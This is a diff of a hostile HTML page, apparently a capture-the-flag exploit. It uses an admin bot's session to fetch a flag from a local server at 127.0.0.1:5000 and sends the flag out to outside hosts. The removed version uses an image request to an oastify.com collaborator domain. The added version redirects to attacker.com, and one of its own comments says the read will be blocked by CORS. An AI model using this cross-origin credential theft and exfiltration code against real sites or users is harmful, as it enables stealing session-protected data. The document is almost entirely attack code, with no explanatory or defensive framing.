@@ -1,18 +1,12 @@
+<!-- hosted at attacker.com/pwn.html -->
 <script>
-function exfiltrate(data){
-    new Image().src =
-        "https://vlk57ha206nfox43wnxavx1aj1ptdj18.oastify.com/?flag="
-        + encodeURIComponent(data);
-}
+  // 1. Fetch flag from local server (bot has admin session)
+  fetch('http://127.0.0.1:5000/api/fetchflag', {credentials: 'include'})
+    .then(res => res.json())      // This cross-origin read WILL be blocked by CORS
+    .then(data => exfil(data.flag))
+    .catch(e => console.log(e));
 
-fetch("http://127.0.0.1:5000/api/fetchflag", {
-    credentials: "include"
-})
-.then(res => res.json())
-.then(res => {
-    exfiltrate(res.flag);
-})
-.catch(err => {
-    exfiltrate("error:" + err.message);
-});
+  function exfil(flag) {
+    document.location = 'https://attacker.com/got?f=' + encodeURIComponent(flag);
+  }
 </script>
